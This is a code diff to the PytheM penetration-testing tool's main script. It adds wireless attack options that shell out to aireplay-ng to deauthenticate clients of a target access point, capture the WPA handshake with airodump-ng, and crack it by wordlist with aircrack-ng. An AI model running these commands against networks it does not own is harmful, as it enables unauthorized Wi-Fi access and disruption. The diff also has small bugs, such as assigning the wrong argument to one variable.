@@ -46,7 +46,7 @@ if __name__ == '__main__':
 
 	parser = argparse.ArgumentParser(description="PytheM v{} = '{}'".format(pythem_version, pythem_codename),version="{} - '{}'".format(pythem_version,pythem_codename),usage="pythem.py -i interface [plugin] [plugin_options]", epilog="By: m4n3dw0lf")
 
-	parser.add_argument("-i","--interface",required=True,type=str, help="Network interface to hear.")
+	parser.add_argument("-i","--interface",required=True,type=str, help="Network interface to use.")
 	parser.add_argument("-g","--gateway",dest='gateway', help="Gateway IP addres.")
 	parser.add_argument("-t","--targets",dest='targets', help="Target IP Address/Range.")
 	parser.add_argument("-f","--file",dest='file',help ="Path to a file.")
@@ -86,9 +86,11 @@ if __name__ == '__main__':
 	wireless = parser.add_argument_group('[Wireless]')
 	wireless.add_argument("--startmon", action='store_true' ,help='Initialize monitor mode on desired interface. ex. "./pythem.py -i wlan0 --startmon"')		
 	wireless.add_argument("--stopmon",action='store_true', help='Terminate monitor mod on desired interface. ex: "./pythem.py -i wlan0mon --stopmon"')
-	wireless.add_argument("--ssid",action='store_true',help="Discover SSIDs and APs near with the monitor interface.")
+	wireless.add_argument("--dumpmon",action='store_true',help="Discover Access points SSID's that are near with the monitor interface. ex: './pythem.py -i wlan0mon --dumpmon'")
+	wireless.add_argument("-c","--channel", type=str, dest='channel', help = "Channel to wpahandshake.")
+	wireless.add_argument("--wpahandshake", action='store_true' , help="Initialize a aircrack-ng suit attack to retrieve WPA handshake and write to .pcap file. ex:' ./pythem.py -i wlan0mon --wpahandshake -c 2 -t 8C:10:D4:D8:0B:96 -f handshake' .")
+	wireless.add_argument("--wpabruteforce", action='store_true', help="Initialize aircrack-ng bruteforce attack into .pcap file. ex: './pythem.py -i wlan0 --wpabruteforce -f wordlist.txt -t handshake.pcap' .")	
 	
-
 	if len(sys.argv) < 2:
     		parser.print_help()
     		sys.exit(1)
@@ -101,7 +103,9 @@ if __name__ == '__main__':
 
 	startmon = args.startmon
 	stopmon = args.stopmon
-
+	wpahandshake = args.dumpmon
+	channel = args.channel	
+	
 	mode = args.mode
 
 	arpmode = args.arpmode
@@ -123,14 +127,17 @@ if __name__ == '__main__':
 
 	if args.scan:
 		try:
-			from modules.scanner import Scanner
-			scan = Scanner(targets,interface,mode)
-			scan.start()
-		
+			if targets is not None:
+				from modules.scanner import Scanner
+				scan = Scanner(targets,interface,mode)
+				scan.start()
+			else:
+				print "[!] Select a valid IP address/range as target with -t ."
+				sys.exit(0)
 		except KeyboardInterrupt:
 			print "[*] User requested shutdown."
 			sys.exit(1)
-				
+
 
 	elif args.spoof and args.sniff:
 		try:
@@ -232,8 +239,6 @@ if __name__ == '__main__':
 			print "[!] Select a file with -f /path/wordlist.txt"
 			sys.exit(0)
 
-
-
 	elif args.bruter:
 
 		try:
@@ -249,15 +254,6 @@ if __name__ == '__main__':
                 except TypeError:
                         print "[!] Select a file with -f /path/arquivo.txt"
                         sys.exit(0)
-
-	elif args.ssid:
-		try:
-			from modules.ssidmon import SSIDmon
-			ssid = SSIDmon(interface)
-			ssid.start()
-		except KeyboardInterrupt:
-			print "[*] User requested shutdown."
-			sys.exit(1)
 
 
 	elif args.geoip:
@@ -301,9 +297,35 @@ if __name__ == '__main__':
 			print "[*] Exception caught: {}".format(e)
 			sys.exit(0)
 
+	elif args.dumpmon:
+		try:
+			os.system("airodump-ng %s" % interface)
+		except Exception as e:
+			print "[*] Exception caught: {}".format(e)
+			sys.exit(0)
 
+
+	elif args.wpahandshake:
+		if args.channel == None or args.targets == None or args.file == None:
+			print "[-] Select a valid channel with -c, a valid bssid with -t and a valid file to write .pcap with -f ."
+			sys.exit(0)
+		else:
+			try:
+				os.system("aireplay-ng %s -0 10 -a %s  "%(interface, targets)) 
+				os.system("airodump-ng %s --bssid %s -c %s -w %s"%(interface, targets, channel, file))
+			except Exception as e:
+				print "[*] Exception caught: {}".format(e)
+	elif args.wpabruteforce:
+		if args.file == None or args.targets == None:
+			print "[-] Select a valid .pcap handshake with -t and a valid wordlist with -f"
+			sys.exit(0)
+		else:
+			try:
+				os.system("aircrack-ng %s -w %s" % (targets, file))
+			except Exception as e:
+				print "[*] Exception caught: {}".format(e)
 	else:
-		print "Select a valid option , --help check your sintax."
+		print "[!] Select a valid option, check your sintax with --help."
 		sys.exit(1)
 
 	
